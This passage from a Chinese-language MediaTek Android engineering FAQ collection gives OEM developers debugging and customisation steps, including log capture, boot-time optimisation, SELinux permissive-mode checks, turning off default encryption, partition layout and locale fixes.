注意：抓取到layerdump后，请将layerdump的所生成的文件SF_layerdump_all(在Linux环境下就是手机的data/SF_dump目录和SF_layerdump_all.log文件)和复现问题的mobile log一并提交到eService上来。 

抓到layerdump之后，根据layerdump的结果，再做下一步分析；

如果layerdump看到的目标画面not ok，则参考如下FAQ做进一步确认，看是app本身的问题还是UI framework绘制的问题；

FAQ10366  如何抓取View Hierarchy for UI Automator?
```

## [性能]  [FAQ18051]  M版本开机时间优化

```text
在升级到M版本之后，谷歌在camera新增了一个叫“media.camera.proxy”的service，在开机过程中会去连接该service。
当连接不上时会try 5次，持续5秒左右。影响开机的performance。
 
如下是连接不上的Log：
01940 01-01 08:35:59.563987   222   222 I ServiceManager: Waiting for service media.camera.proxy...
02086 01-01 08:36:00.564399   222   222 I ServiceManager: Waiting for service media.camera.proxy...
02294 01-01 08:36:01.564777   222   222 I ServiceManager: Waiting for service media.camera.proxy...
02387 01-01 08:36:02.565194   222   222 I ServiceManager: Waiting for service media.camera.proxy...
02494 01-01 08:36:03.565630   222   222 I ServiceManager: Waiting for service media.camera.proxy...
 
可以打开/frameworks/av/services/camera/libcameraservice/CameraService.cpp
找到pingCameraServiceProxy这个函数
将
sp<IBinder> binder = sm->getService(String16("media.camera.proxy"));
改为
sp<IBinder> binder = sm->checkService(String16("media.camera.proxy"));
```

## [FAQ11485]  [SELinux Debug] 权限(Permission denied)问题如何确认是Selinux 约束引起?

```text
android KK 4.4 版本后，如果发现进程无法访问某些文件，无法连接socket 等问题，并且发现errno 是EPERM(Operation not permitted) 或者 EACCES (Permission denied), 如何确认此类问题是因为SELinux 约束引起?
 
[Keyword] 
android, SELinux, Permission denied, 访问限制,  权限问题
 
[Solution] 
在Android KK 4.4 版本后，Google 有正式有限制的启用SELinux, 来增强android 的安全保护。
SELinux 分成enforcing mode 和 permissive mode, enforcing mode 会强制性限制访问; 而permissve mode 只审查权限, 但不限制, 即不会产生实质性影响.
 
KK 版本, Google 只有限制的启用SELinux, 即只有针对netd, installd, zygote, vold 以及它们直接fork 出的child process 使用enforcing mode, 但不包括zygote fork的普通app.

L  版本后, Google 全面开启SELinux, 所有的process 都使enforcing mode， 影响面非常广.
 
 
另外为了限制user 版本root 权限，针对su 有做特别的处理，可以参考FAQ android KK 4.4 版本后，user 版本su 权限严重被限制问题说明
 
目前所有的SELinux check 失败，在kernel log 或者android log(L版本后)中都有对应的"avc:  denied" 或者 "avc: denied"的LOG 与之对应。反过来，有此LOG，并非就会直接失败，还需要确认当时SELinux 的模式, 是enforcing mode 还是 permissve mode, 通常在LOG 上带有 permissive = 1 即是permissive mode, 否则permissve = 0 即是enforcing mode.
 
如果问题容易复现，我们可以先将SELinux 模式调整到Permissive mode，然后再测试确认是否与SELinux 约束相关.
在ENG 版本中:
adb shell setenforce 0
 
如果设置成permissive mode 后问题依旧，说明还有其他的权限问题约束，否则就是SELinux 方面的问题。
 
[相关FAQ] 
[FAQ11414]  android KK 4.4 版本后，user 版本su 权限严重被限制问题说明
[FAQ11486]  在Kernel Log 中出现"avc: denied" 要如何处理?
[FAQ11484]  如何设置确认selinux 模式
[FAQ11483]  如何快速Debug SELinux Policy 问题
```

## [性能]  [默认值]  [FAQ14128]  L版本如何关闭默认加密

```text
L版本手机默认加密，那如何关闭默认加密呢?
  
[SOLUTION] 
关闭加密功能有两种情况：

1      How to disable default encryption in your own image

(1)    Modify fstab.{ro.hardware} in ‘out’ folder
alps\out\target\product\[project] \root\ fstab.{ro.hardware}
Set the flag back to encryptable for /data

(2)    Re-pack boot.img
make ramdisk-nodeps; make bootimage-nodpes

(3)    Download the new boot.img by flashtool

2         How to disable default encryption in your codebase

a)        Modify fstab.{ro.hardware} in your codebase

device\mediatek\ [project] \ fstab.{ro.hardware}

If the project doesn’t have it own fstab.{ro.hardware} . Please create it

Modify device.mk to use the modified fstab.{ro.hardware} .

Set the flag back to encryptable for /data
b)        Re-build boot.img
make bootimage

c)        Download the new boot.img by flashtool
```

## [默认值]  [FAQ04464]  [USB] 如何修改USB连接后的默认功能

```text
如何修改USB连接后通知栏中默认选择的功能

M版本：
在M版本上，手机连接PC，PC上能显示出MTP，但不能访问存储。默认的功能还是charging only。
Android M 版本Follow 的是Google Default Charging Only的行为，不建议修改。

L版本：
修改：
/device/mediatek/common/device.mk

# default usb function
ifeq ($(strip $(MTK_MASS_STORAGE)),yes)
ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=mass_storage
//修改上面成想要的功能，如 ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=mtp
else 
ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=mtp //这里也同步修改 
endif
修改后，需要重新完全编译。先执行make clean 再 make all

KK及以前版本：

以默认功能为MTP为例，可在main.mk中，使
ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config=mtp
```

## [FAQ11901]  [PMT] 客制化分区Partition问题汇总

```text
客制化Partition的需求主要就是调整分区size和新增分区，目前MOL系统针对客制化分区的FAQ有很多个并且过于分散，本FAQ主要针对目前已有的FAQ进行汇总，同时也汇总了DCC上需要参考的相关文档。
 
如果有分区客制化的需求，请首先到DCC搜索以下几份文档参考:
(1)Partition Layout Introduction and Customization_V1.pptx
(2)MT6582_Partition_Layout_Introduction_and_Customization_V2.pptx
(3)How_to_Add_an_Image_Partition.ppt
(4)How to add a ext4 partition_MT6572.pptx
(5)How to add a ext4 partition_MT6572_AOSP.pptx
(6)How to add a ext4 partition _MT6589（JB）（customer）.pptx
(7)How to add a UBIFS partition.pptx

基本上参考这几份文档就比较明确如何做分区客制化操作了。

相关的FAQ汇总如下:
(1) 分区含义介绍
[FAQ03559]  [Storage] MTK platform partition meaning 
(2) 添加raw data分区
[FAQ04465] 【partition】如何在77或89平台上添加raw data分区 

(3) emmc添加ext4分区
[FAQ04466] 【partition】如何在JB平台上添加ext4分区 

(4) nand flash添加UBIFS分区
[FAQ06763]  [Storage] 如何在mt6572 UBIFS 上创建新分区 

(5) nand flash添加FAT分区
[FAQ04352]  [Storage] 如何实现在nand上创建一个FAT分区

(6) 分区大小设定
[FAQ06257] Flash上新建分区的大小限定
[FAQ04658] 【partition】android\cache\userdata三个partition大小设定 
[FAQ11957]  【Partition】一套代码多个项目只有一个分区表，如何调整不同项目的Partition Size

(7) 修改分区表
[FAQ04503] 【partition】partition_table中各sheet的名称的含义
[FAQ11445] 【Partition】修改了分区表文件partition_table_MT65XX.xls，但是没有生效 
[FAQ09996] 同一套代码实现不同的项目使用不同的客制化分区表 

(8) 去掉内置T卡分区
[FAQ04137]  [Storage] 如何将emmc上的内置sdcard拿掉 
[FAQ06774] ICS\ICS2\JB版本上如何去掉内置SD卡
```

## [FAQ05616]  [BMT] 采用Fuel Gauge可能出现的几种电量现象及解释

```text
首先应该熟悉两个变量，bat_volt_check_point是UI上面显示的值。
gFG_capacity_by_C,库仑计计算的电量值.也等于SOC的值.
公式 DOD1 = DOD0 + (-Car/Qmax).
DOD1对应当前的电量值.
DOD0对应初始的电量值.
Car 为t时间内, 流过Rfg电阻电流的电量.
Qmax为电池的容量.
下面几种情况会更新DOD0的值，
1.开机头10S.
2.插拔USB.
3.电池充满的状态
4.电池容量为15%和0%的情况

正常情况下如果，库仑计获取的初始电量DOD0的值比较准确，
那么，gFG_capacity_by_c的值会很准，
实际上，gFG_capacity_by_c跟实际的电量会有点小偏差。不过该值
会在充电过程中与实际电量同步起来。譬如充电过程中是在100%
不充电过程中是在15%和0%
 
[PLATFORM] 
MT6575 MT6515 MT6577 MT6517  MT6589

请结合
alps\mediatek\platform\mt6589(mt6575/mt6577)\kernel\driver\power\
mt6320_battery.c
mt6575_battery.c
mt6577_battery.c
中mt6575_battery_update或是mt6320_battery_update来理解.

采用Fuel gauge方案。
1.充电情况
A.充电到99%，可能需要等上一段比较长的时间才能到100%.
----->采用FG的计算电量的变量gFG_capacity_by_C先到达100，而实际上，电池还没有充满，此时会
先将UI显示即Bat_Volt_Check_point定格在99.直到电池满足充满条件时，才会让Bat_Volt_Check_point
值变成100，并在UI上面显示100，此时底层的值为gFG_capacity_by_C以及Bat_Volt_check_point为100.
上层会show满的图片，并停止充电。
电池充满的条件是，进入top_off mode,并且充电电流小于200mA，这个值具体看软件的定义。

B.充电从90%(可能是其他值)到100%需要的时间比较长
----->Battery充电进入硬件的CV阶段，此时充电电流减小。对于库仑计的方式来计算电量，
DOD1 = DOD0 + Car/Qmax，Car = I*t，每增加一%，如果电流恒定，那么电量增加的时间是相等，在CC阶段，电流比较大，每增加1%的时间，
所需要的时间比较短，在CV阶段，电流减小，每增加1%的时间就会变长。
当battery 充满即满足charging full的条件。此时电量会每10S，Bat_Volt_check_point增加1%，在UI上面显示也会相应每10S增加1%一直到100%.
假设FG电量的方式gFG_capacity_by_c为96,电池满足充满的条件，此时，
Bat_volt_check_point(即UI显示)会每10S增加1，当Bat_volt_check_point为100时，
此时会调用FGADC_SW_RESET_parameter,直接将DOD1变成0，也即是
gFG_capacity_by_c变成100.
 
C.Recharging
----->电池充满后，会停止充电，此时系统由电池来供电，当电量低于4.11时，此时
又会重新充电，但是，UI上面会一直显示100%，假设这个时候拔掉USB，这个时候
电量会从100%每1min down 1%去syc FG的电量。
最差的情况，如果FG的电量变成96%，那么4min后，UI显示就变成96.
 

2.不充电情况
A.出现在20或者其他值，很快下降到15%，或者是在15%处停留时间比较久。
---->
这是因为15%是同步点，当电池真实电量成为15%，FG计算电量方式会同步到15%.
 
B.出现在8%或者其他值，然后很快掉到1%.
---->
当实际的电量达到0%，也即电池电压的值小于3.4V，此时，UI上面会每10S，下降1直到
0%，而FG的电量也会每10S，update一次，直到0.
 
C.1%停留的时间比较久.
---->
当FG的计算方式先达到0%,那么UI上面会保持为1%，直到真实的电池容量变为0，也即是
电池电压小于3.4V
 
以上的情况都是软件的正常处理流程.初始的电量DOD0获取正确, 电量就会准确.
而当有点小偏差，那么就会出现上述的一些情况.
```

## [log]  [FAQ05745]  [OTA]  user版本进行OTA升级时如何抓取升级过程的log

```text
【eng版本的log】
In recovery mode
adb pull /tmp/recovery.log

Reboot to normal mode
/cache/recovery/last_log

【user版本的log】
方法一：
In recovery mode
目前没有办法在user版本也看到recovery.log，目前的办法是
直接用eng版本的recovery.img替换user版本的recovery.img，然后抓取log。
Reboot to normal mode
在user版本也会产生/cache/recovery/last_log，但是可能会不能用adb pull出来！目前的办法是做完recovery，reboot到normal mode后，重新烧boot.img，用eng版本的boot.img替换user 版本的boot.img，然后将log pull出来！

方法二：
    升级或者恢复出厂设置后，手机断电，参考 FAQ05169[Storage] 如何从手机上readback任意分区的image回来?将cache分区回读，并且mount，得到cache/recovery目录的log。
```

## [log]  [FAQ03442]  [Recovery] 如何在recovery mode下抓取LOG

```text
1、在recovery mode下,升级动作之后 adb pull /tmp/recovery.log

2.如果是KK版本：
在nomal mode下 adb pull /cache/recovery/last_log_r
如果是KK之后的版本：
在nomal mode下 adb pull /cache/recovery/last_log

如果是user版本：请参考：

FAQ05745：user版本进行OTA升级时如何抓取升级过程的log
```

## [FAQ18460]  低电提示提示一次后就不再弹出

```text
手机在弹出HUN(head-up notification)低电提示后不充电继续使用，之后没有再弹出HUN提示低电。

此现象是Google默认设计，用户将某条HUN滑动收缩起来，HUN所在App在短期内发送的下一条HUN将不以HUN方式提醒用户. 用这种方式记录用户短期行为，避免再次骚扰用户.
```

## [log]  [FAQ18236]  [Android M]  M版本 bluedroid蓝牙问题分析需要哪些log及如何抓取

```text
M版本开始使用google bluedroid stack原生架构
L版本用的是MTK blueangel stack 架构

[SOLUTION] 
1. common 问题需要log: mtklog, hcilog.
注意:
(1)蓝牙的main log 需要打开更多的debug level 才能抓到，打开方式有2种：
a:把手机etc/bluetooth/bt_stack.conf文件pull 出来，把debug level 相关项都设置成6，
原路径push 覆盖， 看看modify time 是否是当时push的时间，再adb reboot.
b:请提交ES 来获取可以配置debug level的APK.
(2)Hcilog仍在“设置”中的“开发者选项”，勾选“启用蓝牙HCI信息收集日志”功能，hci log 保存在mtklog/btlog 路径下。
(3)Hcilog在蓝牙关开后会重新生成新的log, 所以对于蓝牙多次开关测试引起的问题，需要提供前面多份的hcilog.
(4)Hcilog的查看工具请下载安装：http://www.fte.com/support/download.aspx?mode=update&iid=1w

2. A2DP 播放声音（音乐，提示音，按键音,触屏音等）卡顿，无声,杂音等异常问题需要log: mtklog, hcilog, audiodump（请参考FAQ03727）
3. HFP SCO modem语音电话引起的杂音，卡顿，无声等异常问题需要log: mtklog, hcilog, vmlog（请参考FAQ03727）
4. HFP SCO 微信/QQ/skype/line 语音，和voip 网络电话等 引起的杂音，卡顿，无声等异常问题需要log: mtklog, hcilog, audiodump（请参考FAQ03727）
5. 当确认到是firmware contronller 问题时还需要log: air sniffer log(请DCC 下载Ellisys User Manual.pptx)
```

## [log]  [FAQ18459]  通话记录显示Unknown

```text
问题描述：从平台拨打一个已经存在通话录里的联系人，在InCallUI界面，刚开始显示的信息还是存储的联系人的具体信息，但当通话接通的瞬间，InCallUI界面显示为Unknown，在通话结束后CallLog中存储的也是Unknown的信息。

关键Log分析：

1.在对应的radio.log中查看电话接通瞬间ECPI的返回信息

06-21 15:09:55.268856 976 994 D AT : AT< +ECPI: 1,6,0,1,0,0,"",128,""
06-21 15:09:55.268880 976 994 D AT : RIL_URC_READER Enter processLine:+ECPI: 1,6,0,1,0,0,"",128,""

如果是这种log，则说明是SIM卡开通了号码隐藏服务，后面就check拨打端和接听端SIM卡是否有开通对应的服务，进行对比测试。

06-21 15:10:22.545596 976 994 D AT : AT< +ECPI: 1,6,0,1,1,0,"38163520502",145,""
06-21 15:10:22.545619 976 994 D AT : RIL_URC_READER Enter processLine:+ECPI: 1,6,0,1,1,0,"38163520502",145,""

如果是这种log，则说明是本身平台处理的问题，需要继续看步骤2。

2.在radio.log中继续查看CLIR

Line 1899: 06-28 07:28:36.556097  1491  1491 D ImsPhoneCallTracker: [ImsPhoneCallTracker]  [Phone1]  dial clirMode=0

如果是支持VOLTE，注册上IMS网络，则会看到这些log信息，clirMode=0则是问题所在；如果不是注册的IMS网络，则看不到这些log；这两种情况下都需要看步骤3分析对应的代码。

3.查看CallTracker中dial函数异常点（红色部分）

注册上IMS网络，需要查看ImsPhoneCallTracker.java中dial 函数：

非IMS网络，需要查看GSMCallTracker.java中的dial函数：

解决方法：

将步骤3中的红色部分作出如下修改：

将 CommandsInterface.CLIR_DEFAULT修改为CommandsInterface.CLIR_SUPPRESSION
```

## [log]  [FAQ18297]  为何Monkey测试时MTKlogger UI界面不可用

```text
adb shell setprop ro.monkey true, MTKlogger UI界面不可用，start/stop按钮消失

这是敝司特意的设计，设计的目的是：防止monkey 测试过程中，误打开mtklogger，误关闭mtklogger导致抓不到log。
所以在monkey测试中，mtklogger UI是不让操作的，重启后可恢复。
```

## [性能]  [FAQ18143]  L/M版本首次/非首次开机时间优化

```text
首次开机时间优化可先参考[FAQ13573] L版本首次开机慢  进行修改。

非首次开机时间优化需要check以下阶段是否存在问题：
Zygote阶段：
一般有两个耗时点：
预加载class/resource的时间。需要确认是否有添加很多系统资源。
这期间是否有很多GC动作；

SystemServer阶段：
（1）PMS scan package阶段，PMS扫描apk的时间与预置apk的数量及大小有关，预置apk的size越大、数量越多扫描时间会越长。一般建议如果一个apk的elapsed time大于100ms需要删除该预置apk。
01-09 08:30:01.487   750   750 D PackageManager: scan package: /system/framework/framework-res.apk , end at: 16266ms. elapsed time = 87ms.
01-09 08:30:01.499   750   750 D PackageManager: scan package: /system/framework/mediatek-res , end at: 16278ms. elapsed time = 11ms.
01-09 08:30:01.515   750   750 D PackageManager: scan package: /system/priv-app/BackupRestoreConfirmation , end at: 16295ms. elapsed time = 15ms.
01-09 08:30:01.544   750   750 D PackageManager: scan package: /system/priv-app/CDS_INFO , end at: 16323ms. elapsed time = 28ms.
01-09 08:30:01.574   750   750 D PackageManager: scan package: /system/priv-app/CalendarProvider , end at: 16354ms. elapsed time = 31ms.
。。。。。。
01-09 08:30:04.957   750   750 D PackageManager: scan package: /system/app/VoiceUnlock , end at: 19736ms. elapsed time = 29ms.
01-09 08:30:04.986   750   750 D PackageManager: scan package: /system/app/YGPS , end at: 19765ms. elapsed time = 28ms.
01-09 08:30:05.015   750   750 D PackageManager: scan package: /system/app/webview , end at: 19794ms. elapsed time = 29ms.
（2）PMS dexopt阶段：开机时apk作Running dexopt的操作比较耗时，需要参考[FAQ14131]  L版本预编译提取apk的odex文件进行修改。
（3）开机过程出现camera I2C transfer timeout，需要排查camera加载慢的原因。
[292:mediaserver]  [mt-i2c] ERROR,481: id=0,addr: 10, transfer timeout
（4）Check各个service开机初始化过程的耗时情况，如果某个service初始化过程耗时，需要check这个具体service的行为。

BootAnimation阶段：
如果log中有打印Waiting for service media.camera.proxy... ，可以参考[FAQ18051] M版本开机时间优化进行修改；
当开机动画包中图片很多或占内存很大时会出现lowmemory的现象，导致开机较慢。建议将开机动画包bootanimation.zip中part1部分的图片控制在10张以内。

Keyguard阶段：check锁屏绘制是否存在延时
//画锁屏
01-09 08:30:17.710   891   891 D KeyguardViewMediator: handleShow
//锁屏画完
01-09 08:30:17.787   891   891 D KeyguardViewMediator: handleShow exit

相关FAQ：
[FAQ13573] L版本首次开机慢
[FAQ14128] L版本如何关闭默认加密
[FAQ18051] M版本开机时间优化
```

## [log]  [FAQ14812]  如何快速对系统重启问题进行归类

```text
当手机发生系统重启，即导致kernel重启的异常时，会在手机中的/data/aee_exp目录下保存异常重启的db。工程师可以通过GAT的bug report功能，或者直接通过adb pull，把对应的db从手机中抓回来。进一步，对于异常重启的类型，需要通过GAT工具解开db档案（解开方式参考MTK-online上的文档GAT_User_Guide(Customer).docx之5.1的部分），对里面的SYS_KERNEL_LOG/SYS_LAST_LOG/SYS_REBOOT_REASON 内容进行解析，才能知道具体的重启的类型。
一般来说，导致kernel重启的异常重启，包括Kernel Panic, Watchdog Timeout, Hardware Reboot这三种类型。一个完整的Kernel Panic，其db解开来会包含如下的 档案：

[SOLUTION] 
1. Kernel Panic
即linux kernel发生了无法修复的错误，从而导致panic。通过查看SYS_KERNEL_LOG的内容，kernel Panic进一步可以分为如下几类：
a. 普通的data abort。从SYS_KERNEL_LOG中，可以检索到如下的info:

Unable to handle kernel NULL pointer dereference at virtual address XXXXXXXX

如上的XXXXXXXX代表某个非法地址。这种类型是最多的。

b. oom 主动触发的panic。从SYS_KERNEL_LOG中，可以检索到如下的info:

Kernel panic - not syncing: Out of memory and no killable processes...

此种类型的panic一般是某个process或者APK耗尽了memory资源，从而kernel主动触发的panic重启。对于这种类型的重启，强烈建议工程师把如上的info填写到eService 的标题中，这样MTK可以对eService进行一次到位的分配。

c. undefined instruction，未定义指令异常。从SYS_KERNEL_LOG中，可以检索到如下的info:

Internal error: Oops - undefined instruction

此类异常较为少见，可能是CPU/DRAM 不稳定或者受干扰导致的问题。

d. bad mode异常，即PC处于一个无效的virtual address。从SYS_KERNEL_LOG中，可以检索到如下的info:

Bad mode in Synchronous Abort handler detected
...
[14820.652408] -(1)[682:VSyncThread_0]  [<ffffffc000088f90>]  bad_mode+0x78/0xb0

此类异常较为少见，可能的原因是stack错乱，或者未注册回调函数引起。


2. watchdog 超时

a. 底层看门狗超时。从SYS_KERNEL_LOG中，可以检索到如下的info:

for arm64 platform
PC is at aee_wdt_atf_info+0x4c8/0x6dc
LR is at aee_wdt_atf_info+0x4c0/0x6dc

for arm32 platform
PC is at aee_wdt_irq_info+0x104/0x12c
LR is at aee_wdt_irq_info+0x104/0x12c

此类异常较为常见，多见于底层频繁irq/bus卡死，导致kicker无法被schedule，从而引起watch dog触发中断，引导系统进入FIQ处理流程，最终call到BUG触发重启。

b.上层hang_detect 触发看门狗超时。从SYS_KERNEL_LOG中，可以检索到如下的info:

[ 2131.086562]  (0)[77:hang_detect]  [Hang_Detect]  we should triger HWT ...
...

[ 2180.467416] -(0)[77:hang_detect] PC is at aee_wdt_irq_info+0x154/0x170

[ 2180.467426] -(0)[77:hang_detect] LR is at aee_wdt_irq_info+0x154/0x170
...

此异常类型较为常见，多见于GPU/SD卡/eMMC 无法满足surfacelinger/system_server的通讯需求，从而导致上层卡死，进而主动触发看门狗超时重启。对于这种类型的重启，强烈建议工程师把如上的Hang_Detect关键字填写到eService 的标题中，这样MTK可以对eService进行一次到位的分配。

3. Hardware Reboot

hardware reboot是watch dog直接发出reset信号，导致整个系统重启；在重启之前，并没有触发任何异常处理流程。一般情况下，hardware reboot对应的db不会有SYS_KERNEL_LOG 可以排查，只能从SYS_LAST_KMSG获知异常之前kernel的动作，以及从SYS_REBOOT_REASON 获知异常时的CPU寄存器值和其它参数。
从ZZ_INTERNAL 档案，可以知道发生了hardware reboot
Hardware Reboot,0,0,99,/data/core/,0,,HW_REBOOT,Fri Jul  3 14:31:53 CST 2015,1

就上面所罗列的诸多异常重启，工程师务必把如上黄底部分的log片段拷贝到eService的Description栏位，并把红色的关键字填写到eService的标题中，这样，可以大大加快eService的分配流程。
```

## [语言]  [icu]  [FAQ11737]  添加一些语言后，切换到该语言手机自动重启，添加ICU资源

```text
新增一些语言比如 哈萨克斯坦语(kk)、奥罗莫语(om)等，添加成功后在Setting语言列表中切换到该语言，
手机重启且一直停留在开机动画界面。查看log可以发现如下特殊语句：
01-01 00:12:34.687  4365  4365 E ICU     : Couldn't find ICU yesterday/today/tomorrow for om_ET
01-01 00:12:34.687  4365  4365 W dalvikvm: Exception Ljava/lang/AssertionError; thrown while initializing Llibcore/icu/LocaleData;
01-01 00:12:34.687  4365  4365 W dalvikvm: Exception Ljava/lang/AssertionError; thrown while initializing
[SOLUTION] 
原因一些语言的icu资源不全导致，external\icu4c\data\locales\om.txt确少fields项，下面是英语的部分定义，可以先把这段加进去验证，验证ok后需要做做翻译。

fields{
    day{
        dn{"Day"}
        relative{
            "-1"{"Yesterday"}
            "0"{"Today"}
            "1"{"Tomorrow"}
        }
    }
    dayperiod{
        dn{"AM/PM"}
    }
    era{
        dn{"Era"}
    }
    hour{
        dn{"Hour"}
    }
    minute{
        dn{"Minute"}
    }
    month{
        dn{"Month"}
        relative{
            "-1"{"Last month"}
            "0"{"This month"}
            "1"{"Next month"}
        }
    }
    second{
        dn{"Second"}
    }
    week{
        dn{"Week"}
        relative{
            "-1"{"Last week"}
            "0"{"This week"}
            "1"{"Next week"}
        }
    }
    weekday{
        dn{"Day of the Week"}
    }
    year{
        dn{"Year"}
        relative{
            "-1"{"Last year"}
            "0"{"This year"}
            "1"{"Next year"}
        }
    }
    zone{
        dn{"Time Zone"}
    }
}
```

## [FAQ09662] 如何实现字体切换功能

```text
一、 实现单个字体切换
可以参考DMS文档：Font Install and Runtime Change On ICS guideline.doc

二、多个字体(多个字体一套风格，比如泰语字库、英文字库)
实现这个功能其实是采用了系统在加载字体时会为每个字体指定加载路径的原理，只要把我们要替换的字库文件编译到系统目录下，然后修改要替换的字体的路径就可实现这一功能。

1、添加字库
1)把对应的字库文件拷贝到frameworks/base/data/fonts下
2)修改fonts.mk (frameworks/base/data/fonts)

a、ICS
PRODUCT_COPY_FILES := \
......
frameworks/base/data/fonts/NewFontFile.ttf:system/fonts/DroidSansThai-My.ttf \
frameworks/base/data/fonts/NewFontFile.ttf:system/fonts/ Roboto-Regular-My.ttf \

b、JB
PRODUCT_PACKAGES:= \
DroidSansThai-My.ttf \
Roboto-Regular-My.ttf \
......

4)对于JB2，JB3，JB5，kk还需修改android.mk

           ifeq ($(MINIMAL_FONT_FOOTPRINT),true)

           ……
else # !MINIMAL_FONT
font_src_files +=

          ……

          DroidSansThai-My.ttf \
       Roboto-Regular-My.ttf \

5)对于GB版本只需修改Android.mk
           copy_from := \ 
           DroidSansThai-My.ttf \
            Roboto-Regular-My.ttf \
            ……
    注：请不要修改fallback_fonts.xml等xml文件，这个添加仅仅是让系统把字库编译到fonts目下。

 2、修改ttf加载路径

 #include <cutils/properties.h>//引入头文件

 SkFontHost_android.cpp（alps\external\skia\src\ports）

    static void getFullPathForSysFonts(SkString* full, const char name[] ) {

    static char args[PROPERTY_VALUE_MAX] ;//定义变量

       property_get("persist.sys.usedmyfont", args, "no");//获取persist.sys.usedmyfont配置

       full->set(getenv("ANDROID_ROOT"));

       full->append(SK_FONT_FILE_PREFIX);

       if(strstr(args,"yes")){

            if(strstr(name,"DroidSansThai")){

                full->append("DroidSansThai-My.ttf");

             }else if(strstr(name,"Roboto-Regular")){

                full->append("Roboto-Regular.ttf");

             }else{

               full->append(name);

             }

        }else{

            full->append(name);

        }

 }

kk版本文件路径：

SkFontConfigInterface_android.（external\skia\src\ports）

3、实现上层切换功能

因为这一步比较容易实现，且不同需求ui设计不同，因此此步骤只提供大概思路，没有具体实现。

1)上层app(比如setting)实现可以切换字体的ui选项。

2)需要定义个配置变量persist.sys.usedmyfont：

当字体切换时SystemProperties.set("persist.sys.usedmyfont", "yes");

当使用默认字体时SystemProperties.set("persist.sys.usedmyfont", "no");

3)  因为这个功能是要重新加载字库文件，因此必须要实现切换字体后要重启手机功能。
```

## [语言]  [FAQ11478]  语言设置为[Developer] Accented English点击显示报错

```text
[DESCRIPTION]  语言设置为[Developer] Accented English点击显示报错 [SOLUTION]  Language 中的[Developer]  Accented English是一种虚拟mapping出来的语言，source code的resource中并没有实际的values-zz-rZZ 的resource与之对应。 针对settings中报的这个问题，是因为ResourceManager将alps/packages/apps/Settings/res/values/strings.xml 中的%1$s 中的占位符号进行了mapping翻译%1$š ，使得formart时找不到对应的占位符而出错。 这个问题的修改方法如下，将alps/packages/apps/Settings/res/values/strings.xml 中的%1$s 替换成 %1$s，避免占位符被mapping翻译。 因为属于google default resource issue，请自行修改验证。
```

## [语言]  [FAQ11536]  KK版本语言列表[Developer] Accented English问题

```text
Android4.4进入到系统设置-语言和输入法-语言，界面就会语言选项里面多了第一个[Developer]  Accented English。
这一项有什么用，如何把它去掉呢?
[SOLUTION] 
KK:
[Developer]  Accented English是一种虚拟mapping出来的语言，source code的resource中并没有实际的values-zz-rZZ 的resource与之对应。
切换到该语言也是仅仅Setting UI的字串发生变化.这是为开发者模式设计的，对于使用者没有多大作用。
添加这个语言项具体为如下红色部分：
LocalePicker.java (frameworks\base\core\java\com\android\internal\app)
public static ArrayAdapter<LocaleInfo> constructAdapter(Context context, final int layoutId, final int fieldId, final boolean isInDeveloperMode) {
    final Resources resources = context.getResources();
    ArrayList<String> localeList = new ArrayList<String>(Arrays.asList(Resources.getSystem().getAssets().getLocales()));
    if (isInDeveloperMode) {
        if (!localeList.contains("zz_ZZ")) {
            localeList.add("zz_ZZ");
        }
        /** - TODO: Enable when zz_ZY Pseudolocale is complete
         *  if (!localeList.contains("zz_ZY")) {
         *      localeList.add("zz_ZY");
         * }
         */
    }
    ……
}
如果要去掉该项，可以把红色部分注释掉。
 
L:
L上与KK不同,L上是判断如不在开发者模式就将"ar_XB"和"ar_XA"拿掉(如果有的话),没有使用"zz_ZZ".
 
有关[Developer] Accented English其他问题可以参考：FAQ11478
```

## [FAQ08190]  如何修改Sim卡语言自适应

```text
一、  系统设定默认语言规则

1.  系统预置语言，即在 makefile 文件中定义的语言；
–  位置：mediatek/config/${Project}/ProjectConfig.mk，默认第一个是系统默认语言
2.  刷机过后，开机重启，如果未插卡，系统语言为预置的语言；
3.  插入SIM卡过后，系统语言根据 SIM 卡来改变， 默认会把刷机过后第一次插的 SIM 卡的语言设置为默认语言；(如果sim的mcc可以在内置的mcc表中找到)
4.  如果用户没有手动在 Settings 里面设置语言，以后系统语言一直是默认语言（第一次插的 SIM 卡的语言），即使是插入其它国家的卡，系统语言也不会变；
5.  如果用户在 Settings 里面手动设置了语言，以后系统语言会为设置后的语言，无论插入什么卡，系统语言不会变，一直为用户手动设置后的语言。

MTK默认设计是如果手机有插卡，那么在开机是会读取SIM的imsi取出mcc，然后通过mcc来查找对应的language，并设置为手机默认语言(相关文件MccTable.javaframeworks\opt\telephony\src\java\com\android\internal\telephony).
二、  修改默认语言

1. 如果想手机默认语言不随SIM的MCC走，请按照如下修改：
在setLocaleFromMccIfNeeded()函数中
//String language = MccTable.defaultLanguageForMcc(mcc); <<注释掉此语句
对于KK版本
在updateMccMncConfiguration()函数中
// locale = getLocaleFromMcc(context, mcc); <<注释掉此语句

2. 如果手机默认语言随SIM卡走
此为operator CT的定制feature，如果有开OP03 option,默认就支持该功能。
如果想非OP03也支持该功能，请按照如下修改:
alps/mediatek/frameworks/base/op/java/com/mediatek/op/telephony/TelephonyExt.java中, 使方法isSetLanguangBySIM()返回true，那么手机的默认语言会使用SIM中的EF_LI(6F05)或者EF_EPL(2F05)中的语言。这两个文件优先使用EF_LI中的，如果EF_LI没有匹配的在使用EF_EPL的。
```

## [语言]  [FAQ08860]  添加语言后语言列表没有显示或者显示空白和乱码

```text
在MTK_PRODUCT_LOCALES（KK及以前版本，L上是PRODUCT_LOCALES）中添某种语言代码，却没有在setting语言列表中找到该语言选项或者出现空白和乱码，出现这样的情况可以按照如下方法排查。

一、检查添加的语言代码是否正确

Android使用语言_区域来确定一种语言，比如en_US,zh_CN，前面两位表示语言，后面两位表示区域，语言和区域中间使用_隔开，多种语言中间用空格分隔。
语言代码遵循ISO_639-1标准，可以参考维基百科：ISO_639-1
http://zh.wikipedia.org/wiki/ISO_639-1

语言代码遵循ISO_3166-1标准，可以参考维基百科：ISO_3166-1
http://zh.wikipedia.org/wiki/ISO_3166-1

Note： Java中使用了几个过时的语言代码，与ISO_639-1中的不一样，见下表，因此在添加下面几种语言的时候需要额外注意：希伯来语，印尼语，意地绪语。

          ISO_639-1  Android/Java
希伯来语(Hebrew) he iw
印尼语(Indonesian) id in
意地绪语(Yiddish) yi ji

二、检查framework是否有对应的value文件夹
